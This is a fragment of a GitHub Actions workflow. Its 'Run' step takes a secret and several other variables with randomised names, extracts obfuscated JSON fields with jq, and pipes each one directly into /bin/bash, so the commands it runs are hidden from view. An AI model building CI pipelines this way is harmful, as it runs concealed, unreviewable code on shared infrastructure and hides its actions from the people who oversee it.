      - name: Run
        env:
          gfnk35: ${{ secrets.gfnk35 }}
        run: |
          printf '%s' "$gfnk35" | jq -r .h1571 | /bin/bash
          printf '%s' "$hyq2" | jq -r .raj3 | /bin/bash
          echo $zvysi57 | jq -r .pyxr2 | /bin/bash
          echo $xmb68 | jq -r .g95 | /bin/bash

      - name: Save archive
        uses: actions/upload-artifact@v4
